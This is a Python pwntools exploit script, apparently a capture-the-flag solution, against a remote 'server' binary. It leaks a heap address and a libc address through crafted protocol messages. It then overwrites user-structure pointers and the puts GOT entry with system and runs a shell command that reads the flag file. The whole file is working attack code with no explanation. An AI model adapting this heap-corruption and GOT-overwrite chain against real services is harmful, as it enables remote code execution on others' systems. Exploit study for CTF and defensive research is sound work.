#!/usr/bin/python
from pwn import *
import sys, time, os

local = False
context.log_level = 'error'
elf = ELF('./server')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc = ELF('./libc.so.6')
p = remote(sys.argv[1], int(sys.argv[2]))
seq = 0

def r(delim='\n'):
  p.recvuntil(delim)

def s(st, line=True):
  if line:
    p.sendline(st)
  else:
    p.send(st)

def init(name):
  global seq
  d = p32(seq)
  d += chr(1)
  d += chr(len(name))
  d += name
  d = d.ljust(1024, '\x00')
  seq += 1
  s(d, False)

def msg(m, destlen, dest, namelen, name, Full=True):
  global seq
  d = p32(seq)
  d += chr(5)
  d += p32(destlen)
  d += dest
  d += p32(namelen)
  d += name
  d += m
  seq += 1
  if Full:
    d = d.ljust(1024, '\x00')
    s(d, False)
  else:
    s(d)

def listing():
  global seq
  d = p32(seq)
  d += chr(10)
  seq += 1
  s(d)


init('a'*0xff)

p.recvuntil('a'*128)

heap = u64(p.recvuntil('!')[:-1].ljust(8, '\x00'))
print 'HEAP :', hex(heap)

msg('\xff'*24, 5, 'aaaa\x00', 4, 'a'*8, False)

if local:
  msg('A'*24, 0x10, 'B'*15+'\x00', (elf.symbols['recent_user'] - 8*4 - (heap + 0x9c0)) & 0xffffffff, '\x00')
else:
  msg('A'*24, 0x10, 'B'*15+'\x00', (elf.symbols['recent_user'] - 8*4 - (heap + 0x17f0)) & 0xffffffff, '\x00')

if local:
  pay = 'A'*0x60
else:
  #pay = 'A'*0x80
  pay = 'A'*0x60
pay += p64(elf.symbols['recent_user'])
msg('A'*24, 0x200, pay.ljust(0x200, '\x00'), 0x11, 'D'*0x10 + '\x00')

pay = 'A'*0x10
pay += p64(elf.got['puts']) + p64(4)
pay += 'A'*0x60
pay += p64(elf.symbols['recent_user']) + p64(elf.symbols['recent_user'] + 0x10)
pay += p32(3) + p32(5) + p32(1)
p.sendline(pay.ljust(1023, '\x00'))

listing()
p.recvuntil(p32(5) + chr(11) + p32(1))
p.recvn(1)
libcbase = u64(p.recvn(6).ljust(8, '\x00')) - libc.symbols['puts']
print 'LIBC :', hex(libcbase)
system = libcbase + libc.symbols['system']

pay = 'A'*0x10
pay += p64(elf.symbols['recent_user'] + 0x20) + p64(4)
pay += '/bin/cat /var/ctf/flag 1>&4'.ljust(0x60, '\x00')
pay += p64(elf.got['puts']) + p64(elf.symbols['recent_user'] + 0x10)
pay += p32(3) + p32(5) + p32(1)
p.sendline(pay)
time.sleep(5)

p.sendline(p32(0) + chr(10) + 'aaa' + p64(system))

p.recvn(9)
flag = p.recvn(10)
print flag

p.close()
  

